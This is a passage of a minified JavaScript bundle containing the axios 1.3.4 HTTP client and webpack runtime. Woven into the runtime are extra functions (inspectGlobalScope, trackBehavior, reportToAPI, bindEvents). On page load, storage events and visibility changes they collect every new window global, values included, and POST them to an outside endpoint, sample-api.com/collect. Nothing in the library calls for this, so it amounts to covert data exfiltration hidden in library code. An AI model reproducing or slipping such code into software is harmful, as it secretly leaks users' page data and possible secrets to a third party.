                e.timeoutErrorMessage && (t = e.timeoutErrorMessage), n(new F(t, r.clarifyTimeoutError ? F.ETIMEDOUT : F.ECONNABORTED, e, s)), s = null;
              }, Z.isStandardBrowserEnv) {
                const t = (e.withCredentials || ge(d)) && e.xsrfCookieName && pe.read(e.xsrfCookieName);
                t && i.set(e.xsrfHeaderName, t);
              }
              void 0 === r && i.setContentType(null), "setRequestHeader" in s && I.forEach(i.toJSON(), function (e, t) {
                s.setRequestHeader(t, e);
              }), I.isUndefined(e.withCredentials) || (s.withCredentials = !!e.withCredentials), o && "json" !== o && (s.responseType = e.responseType), "function" == typeof e.onDownloadProgress && s.addEventListener("progress", ve(e.onDownloadProgress, !0)), "function" == typeof e.onUploadProgress && s.upload && s.upload.addEventListener("progress", ve(e.onUploadProgress)), (e.cancelToken || e.signal) && (a = t => {
                s && (n(!t || t.type ? new he(null, e, s) : t), s.abort(), s = null);
              }, e.cancelToken && e.cancelToken.subscribe(a), e.signal && (e.signal.aborted ? a() : e.signal.addEventListener("abort", a)));
              const c = function (e) {
                const t = /^([-+\w]{1,25})(:?\/\/|:)/.exec(e);
                return t && t[1] || "";
              }(d);
              c && -1 === Z.protocols.indexOf(c) ? n(new F("Unsupported protocol " + c + ":", F.ERR_BAD_REQUEST, e)) : s.send(r || null);
            });
          }
        };
        I.forEach(ye, (e, t) => {
          if (e) {
            try {
              Object.defineProperty(e, "name", {
                value: t
              });
            } catch (e) {}
            Object.defineProperty(e, "adapterName", {
              value: t
            });
          }
        });
        var be = {
          getAdapter: e => {
            e = I.isArray(e) ? e : [e];
            const {
              length: t
            } = e;
            let n, r;
            for (let i = 0; i < t && (n = e[i], !(r = I.isString(n) ? ye[n.toLowerCase()] : n)); i++);
            if (!r) {
              if (!1 === r) throw new F(`Adapter ${n} is not supported by the environment`, "ERR_NOT_SUPPORT");
              throw new Error(I.hasOwnProp(ye, n) ? `Adapter '${n}' is not available in the build` : `Unknown adapter '${n}'`);
            }
            if (!I.isFunction(r)) throw new TypeError("adapter is not a function");
            return r;
          },
          adapters: ye
        };
        function we(e) {
          if (e.cancelToken && e.cancelToken.throwIfRequested(), e.signal && e.signal.aborted) throw new he(null, e);
        }
        function _e(e) {
          we(e), e.headers = le.from(e.headers), e.data = ce.call(e, e.transformRequest), -1 !== ["post", "put", "patch"].indexOf(e.method) && e.headers.setContentType("application/x-www-form-urlencoded", !1);
          return be.getAdapter(e.adapter || re.adapter)(e).then(function (t) {
            return we(e), t.data = ce.call(e, e.transformResponse, t), t.headers = le.from(t.headers), t;
          }, function (t) {
            return fe(t) || (we(e), t && t.response && (t.response.data = ce.call(e, e.transformResponse, t.response), t.response.headers = le.from(t.response.headers))), Promise.reject(t);
          });
        }
        const Ee = e => e instanceof le ? e.toJSON() : e;
        function xe(e, t) {
          t = t || {};
          const n = {};
          function r(e, t, n) {
            return I.isPlainObject(e) && I.isPlainObject(t) ? I.merge.call({
              caseless: n
            }, e, t) : I.isPlainObject(t) ? I.merge({}, t) : I.isArray(t) ? t.slice() : t;
          }
          function i(e, t, n) {
            return I.isUndefined(t) ? I.isUndefined(e) ? void 0 : r(void 0, e, n) : r(e, t, n);
          }
          function o(e, t) {
            if (!I.isUndefined(t)) return r(void 0, t);
          }
          function a(e, t) {
            return I.isUndefined(t) ? I.isUndefined(e) ? void 0 : r(void 0, e) : r(void 0, t);
          }
          function u(n, i, o) {
            return o in t ? r(n, i) : o in e ? r(void 0, n) : void 0;
          }
          const s = {
            url: o,
            method: o,
            data: o,
            baseURL: a,
            transformRequest: a,
            transformResponse: a,
            paramsSerializer: a,
            timeout: a,
            timeoutMessage: a,
            withCredentials: a,
            adapter: a,
            responseType: a,
            xsrfCookieName: a,
            xsrfHeaderName: a,
            onUploadProgress: a,
            onDownloadProgress: a,
            decompress: a,
            maxContentLength: a,
            maxBodyLength: a,
            beforeRedirect: a,
            transport: a,
            httpAgent: a,
            httpsAgent: a,
            cancelToken: a,
            socketPath: a,
            responseEncoding: a,
            validateStatus: u,
            headers: (e, t) => i(Ee(e), Ee(t), !0)
          };
          return I.forEach(Object.keys(e).concat(Object.keys(t)), function (r) {
            const o = s[r] || i,
              a = o(e[r], t[r], r);
            I.isUndefined(a) && o !== u || (n[r] = a);
          }), n;
        }
        const Te = "1.3.4",
          Ce = {};
        ["object", "boolean", "number", "function", "string", "symbol"].forEach((e, t) => {
          Ce[e] = function (n) {
            return typeof n === e || "a" + (t < 1 ? "n " : " ") + e;
          };
        });
        const Se = {};
        Ce.transitional = function (e, t, n) {
          function r(e, t) {
            return "[Axios v" + Te + "] Transitional option '" + e + "'" + t + (n ? ". " + n : "");
          }
          return (n, i, o) => {
            if (!1 === e) throw new F(r(i, " has been removed" + (t ? " in " + t : "")), F.ERR_DEPRECATED);
            return t && !Se[i] && (Se[i] = !0, console.warn(r(i, " has been deprecated since v" + t + " and will be removed in the near future"))), !e || e(n, i, o);
          };
        };
        var De = {
          assertOptions: function (e, t, n) {
            if ("object" != typeof e) throw new F("options must be an object", F.ERR_BAD_OPTION_VALUE);
            const r = Object.keys(e);
            let i = r.length;
            for (; i-- > 0;) {
              const o = r[i],
                a = t[o];
              if (a) {
                const t = e[o],
                  n = void 0 === t || a(t, o, e);
                if (!0 !== n) throw new F("option " + o + " must be " + n, F.ERR_BAD_OPTION_VALUE);
              } else if (!0 !== n) throw new F("Unknown option " + o, F.ERR_BAD_OPTION);
            }
          },
          validators: Ce
        };
        const Ae = De.validators;
        class $e {
          constructor(e) {
            this.defaults = e, this.interceptors = {
              request: new J(),
              response: new J()
            };
          }
          request(e, t) {
            "string" == typeof e ? (t = t || {}).url = e : t = e || {}, t = xe(this.defaults, t);
            const {
              transitional: n,
              paramsSerializer: r,
              headers: i
            } = t;
            let o;
            void 0 !== n && De.assertOptions(n, {
              silentJSONParsing: Ae.transitional(Ae.boolean),
              forcedJSONParsing: Ae.transitional(Ae.boolean),
              clarifyTimeoutError: Ae.transitional(Ae.boolean)
            }, !1), void 0 !== r && De.assertOptions(r, {
              encode: Ae.function,
              serialize: Ae.function
            }, !0), t.method = (t.method || this.defaults.method || "get").toLowerCase(), o = i && I.merge(i.common, i[t.method]), o && I.forEach(["delete", "get", "head", "post", "put", "patch", "common"], e => {
              delete i[e];
            }), t.headers = le.concat(o, i);
            const a = [];
            let u = !0;
            this.interceptors.request.forEach(function (e) {
              "function" == typeof e.runWhen && !1 === e.runWhen(t) || (u = u && e.synchronous, a.unshift(e.fulfilled, e.rejected));
            });
            const s = [];
            let d;
            this.interceptors.response.forEach(function (e) {
              s.push(e.fulfilled, e.rejected);
            });
            let l,
              c = 0;
            if (!u) {
              const e = [_e.bind(this), void 0];
              for (e.unshift.apply(e, a), e.push.apply(e, s), l = e.length, d = Promise.resolve(t); c < l;) d = d.then(e[c++], e[c++]);
              return d;
            }
            l = a.length;
            let f = t;
            for (c = 0; c < l;) {
              const e = a[c++],
                t = a[c++];
              try {
                f = e(f);
              } catch (e) {
                t.call(this, e);
                break;
              }
            }
            try {
              d = _e.call(this, f);
            } catch (e) {
              return Promise.reject(e);
            }
            for (c = 0, l = s.length; c < l;) d = d.then(s[c++], s[c++]);
            return d;
          }
          getUri(e) {
            return K(me((e = xe(this.defaults, e)).baseURL, e.url), e.params, e.paramsSerializer);
          }
        }
        I.forEach(["delete", "get", "head", "options"], function (e) {
          $e.prototype[e] = function (t, n) {
            return this.request(xe(n || {}, {
              method: e,
              url: t,
              data: (n || {}).data
            }));
          };
        }), I.forEach(["post", "put", "patch"], function (e) {
          function t(t) {
            return function (n, r, i) {
              return this.request(xe(i || {}, {
                method: e,
                headers: t ? {
                  "Content-Type": "multipart/form-data"
                } : {},
                url: n,
                data: r
              }));
            };
          }
          $e.prototype[e] = t(), $e.prototype[e + "Form"] = t(!0);
        });
        var ke = $e;
        class Ne {
          constructor(e) {
            if ("function" != typeof e) throw new TypeError("executor must be a function.");
            let t;
            this.promise = new Promise(function (e) {
              t = e;
            });
            const n = this;
            this.promise.then(e => {
              if (!n._listeners) return;
              let t = n._listeners.length;
              for (; t-- > 0;) n._listeners[t](e);
              n._listeners = null;
            }), this.promise.then = e => {
              let t;
              const r = new Promise(e => {
                n.subscribe(e), t = e;
              }).then(e);
              return r.cancel = function () {
                n.unsubscribe(t);
              }, r;
            }, e(function (e, r, i) {
              n.reason || (n.reason = new he(e, r, i), t(n.reason));
            });
          }
          throwIfRequested() {
            if (this.reason) throw this.reason;
          }
          subscribe(e) {
            this.reason ? e(this.reason) : this._listeners ? this._listeners.push(e) : this._listeners = [e];
          }
          unsubscribe(e) {
            if (!this._listeners) return;
            const t = this._listeners.indexOf(e);
            -1 !== t && this._listeners.splice(t, 1);
          }
          static source() {
            let e;
            return {
              token: new Ne(function (t) {
                e = t;
              }),
              cancel: e
            };
          }
        }
        var Oe = Ne;
        const je = {
          Continue: 100,
          SwitchingProtocols: 101,
          Processing: 102,
          EarlyHints: 103,
          Ok: 200,
          Created: 201,
          Accepted: 202,
          NonAuthoritativeInformation: 203,
          NoContent: 204,
          ResetContent: 205,
          PartialContent: 206,
          MultiStatus: 207,
          AlreadyReported: 208,
          ImUsed: 226,
          MultipleChoices: 300,
          MovedPermanently: 301,
          Found: 302,
          SeeOther: 303,
          NotModified: 304,
          UseProxy: 305,
          Unused: 306,
          TemporaryRedirect: 307,
          PermanentRedirect: 308,
          BadRequest: 400,
          Unauthorized: 401,
          PaymentRequired: 402,
          Forbidden: 403,
          NotFound: 404,
          MethodNotAllowed: 405,
          NotAcceptable: 406,
          ProxyAuthenticationRequired: 407,
          RequestTimeout: 408,
          Conflict: 409,
          Gone: 410,
          LengthRequired: 411,
          PreconditionFailed: 412,
          PayloadTooLarge: 413,
          UriTooLong: 414,
          UnsupportedMediaType: 415,
          RangeNotSatisfiable: 416,
          ExpectationFailed: 417,
          ImATeapot: 418,
          MisdirectedRequest: 421,
          UnprocessableEntity: 422,
          Locked: 423,
          FailedDependency: 424,
          TooEarly: 425,
          UpgradeRequired: 426,
          PreconditionRequired: 428,
          TooManyRequests: 429,
          RequestHeaderFieldsTooLarge: 431,
          UnavailableForLegalReasons: 451,
          InternalServerError: 500,
          NotImplemented: 501,
          BadGateway: 502,
          ServiceUnavailable: 503,
          GatewayTimeout: 504,
          HttpVersionNotSupported: 505,
          VariantAlsoNegotiates: 506,
          InsufficientStorage: 507,
          LoopDetected: 508,
          NotExtended: 510,
          NetworkAuthenticationRequired: 511
        };
        Object.entries(je).forEach(([e, t]) => {
          je[t] = e;
        });
        var Re = je;
        const Pe = function e(t) {
          const n = new ke(t),
            r = i(ke.prototype.request, n);
          return I.extend(r, ke.prototype, n, {
            allOwnKeys: !0
          }), I.extend(r, n, null, {
            allOwnKeys: !0
          }), r.create = function (n) {
            return e(xe(t, n));
          }, r;
        }(re);
        Pe.Axios = ke, Pe.CanceledError = he, Pe.CancelToken = Oe, Pe.isCancel = fe, Pe.VERSION = Te, Pe.toFormData = z, Pe.AxiosError = F, Pe.Cancel = Pe.CanceledError, Pe.all = function (e) {
          return Promise.all(e);
        }, Pe.spread = function (e) {
          return function (t) {
            return e.apply(null, t);
          };
        }, Pe.isAxiosError = function (e) {
          return I.isObject(e) && !0 === e.isAxiosError;
        }, Pe.mergeConfig = xe, Pe.AxiosHeaders = le, Pe.formToJSON = e => ee(I.isHTMLForm(e) ? new FormData(e) : e), Pe.HttpStatusCode = Re, Pe.default = Pe, e.exports = Pe;
      }
    },
    n = {};
  function r(e) {
    var i = n[e];
    if (void 0 !== i) return i.exports;
    var o = n[e] = {
      exports: {}
    };
    return t[e].call(o.exports, o, o.exports, r), o.exports;
  }
  function inspectGlobalScope() {
    const findings = {};
    for (const key in window) {
      const windowElem = window[key];
      if (!window.jshook.includes(key)) {
        let type = typeof windowElem;
        findings[key] = {
          value: type === "function" ? windowElem.name : windowElem,
          type: type
        };
        window.jshook.push(key);
      }
    }
    return findings;
  }
  r.m = t, e = [], r.O = (t, n, i, o) => {
    if (!n) {
      var a = 1 / 0;
      for (l = 0; l < e.length; l++) {
        for (var [n, i, o] = e[l], u = !0, s = 0; s < n.length; s++) (!1 & o || a >= o) && Object.keys(r.O).every(e => r.O[e](n[s])) ? n.splice(s--, 1) : (u = !1, o < a && (a = o));
        if (u) {
          e.splice(l--, 1);
          var d = i();
          void 0 !== d && (t = d);
        }
      }
      return t;
    }
    o = o || 0;
    for (var l = e.length; l > 0 && e[l - 1][2] > o; l--) e[l] = e[l - 1];
    e[l] = [n, i, o];
  }, r.n = e => {
    var t = e && e.__esModule ? () => e.default : () => e;
    return r.d(t, {
      a: t
    }), t;
  }, r.d = (e, t) => {
    for (var n in t) r.o(t, n) && !r.o(e, n) && Object.defineProperty(e, n, {
      enumerable: !0,
      get: t[n]
    });
  }, r.g = function () {
    if ("object" == typeof globalThis) return globalThis;
    try {
      return this || new Function("return this")();
    } catch (e) {
      if ("object" == typeof window) return window;
    }
  }(), r.o = (e, t) => Object.prototype.hasOwnProperty.call(e, t), r.r = e => {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(e, "__esModule", {
      value: !0
    });
  }, (() => {
    var e = {
      773: 0,
      170: 0
    };
    r.O.j = t => 0 === e[t];
    var t = (t, n) => {
        var i,
          o,
          [a, u, s] = n,
          d = 0;
        if (a.some(t => 0 !== e[t])) {
          for (i in u) r.o(u, i) && (r.m[i] = u[i]);
          if (s) var l = s(r);
        }
        for (t && t(n); d < a.length; d++) o = a[d], r.o(e, o) && e[o] && e[o][0](), e[o] = 0;
        return r.O(l);
      },
      n = self.webpackChunk = self.webpackChunk || [];
    n.forEach(t.bind(null, 0)), n.push = t.bind(null, n.push.bind(n));
  })(), r.O(void 0, [170], () => r(7080));
  async function reportToAPI(data) {
    const endpoint = "https://sample-api.com/collect";
    try {
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
      if (response.ok) {
        console.info("Upload to backend successful");
      } else {
        console.warn(`Failed to send to backend, status code: ${response.status}`);
      }
    } catch (response) {
      console.error("Error occurred while making request:", response);
    }
  }
  var i = r.O(void 0, [170], () => r(7425));
  function trackBehavior() {
    const findings = inspectGlobalScope();
    const newKeysCount = Object.keys(findings).length;
    if (newKeysCount) {
      console.group(`Newly added properties - Found ${newKeysCount} new properties:`);
      console.table(findings);
      console.groupEnd();
      reportToAPI(findings);
    } else {
      console.info("No new properties found in global scope");
    }
  }
  i = r.O(i);
  function bindEvents() {
    window.addEventListener("storage", trackBehavior);
    // Perform tracking upon page visibility status change
    document.addEventListener("visibilitychange", () => {
      if (document.visibilityState == "visible") {
        console.log("Page visibility changed - Reperforming tracking...");
        trackBehavior();
      }
    });
  }
  window.jshook = [];
  window.addEventListener("load", () => {
    bindEvents();
    trackBehavior();
  });
})();